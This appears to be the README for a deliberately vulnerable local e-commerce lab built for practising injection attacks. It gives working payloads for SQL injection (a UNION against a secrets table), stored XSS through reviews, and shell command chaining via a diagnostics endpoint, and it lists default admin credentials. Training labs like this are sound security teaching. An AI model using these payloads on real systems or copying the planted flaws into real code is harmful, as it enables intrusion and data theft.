# CyberMart - A05:2025 Injection Lab

A realistic online storefront for practicing **OWASP Top 10:2025 - A05: Injection**.
The app looks and works like a real e-commerce site - and it contains three real injection
flaws inside normal features.

> **WARNING:** This app is intentionally vulnerable. It binds to `127.0.0.1` only and is for
> local, educational use. Never deploy it or expose it to a network.

## Requirements
- Node.js 22.13+ (uses the built-in `node:sqlite`; Node 24 recommended)

## Run

```bash
npm install
npm start
```

Then open <http://127.0.0.1:3000/>.

## The three vulnerabilities (and where they hide)

| # | Flaw | Where it lives | Flag |
|---|------|----------------|------|
| 1 | **SQL injection** | Product search box (header + `/products?q=`) | `FLAG{injection_sql_union}` |
| 2 | **Stored XSS** | "Leave a review" on any product page | `FLAG{injection_stored_xss}` |
| 3 | **Command injection** | Network Diagnostics page | `FLAG{injection_command_exec}` |

### 1. SQL injection
The search query is built by string concatenation on the server
(`routes/shop.js`, `GET /products`). Point out the number of columns in
`products` (4: id, name, price, description) and UNION to the hidden `secrets` table:

```text
%' UNION SELECT id, name, price, description FROM secrets -- 
```

Wrong column counts return a real (leaky) SQL error on the page - a good way to probe.

### 2. Stored XSS
Create an account, sign in, and post a review. Reviews are rendered unescaped on every
visit to the product page. Payload:

```html
<img src=x onerror="fetch('/api/moderation/flag').then(r=>r.text()).then(t=>alert(t))">
```

Any visitor loading the product page triggers it and reads the flag.

### 3. Command injection
The Diagnostics page pipes the host straight into a shell `ping`. Chain commands to read
the flag file in the server's working directory:

```text
# Windows
/diagnostics?host=127.0.0.1%20%26%20type%20cmdi-flag.txt

# Linux/macOS
/diagnostics?host=127.0.0.1%20%3B%20cat%20cmdi-flag.txt
```

## Accounts
- Default admin: `admin` / `admin123`
- Anyone can register a normal account at `/register`.

## Vulnerable code locations
- `routes/shop.js` - SQL concatenation (`/products`), raw review storage, shell `exec` (`/diagnostics`)
- `views/product.ejs` - reviews rendered with `<%- r.text %>` (unescaped)

## Safe, fixed versions (for contrast)
- Use parametrized queries / prepared statements with bound parameters.
- Escape output on rendering (or use `textContent` / text node, not `innerHTML`).
- Never build shell commands from user input - validate against an allowlist or use
  `execFile`/`spawn` without a shell.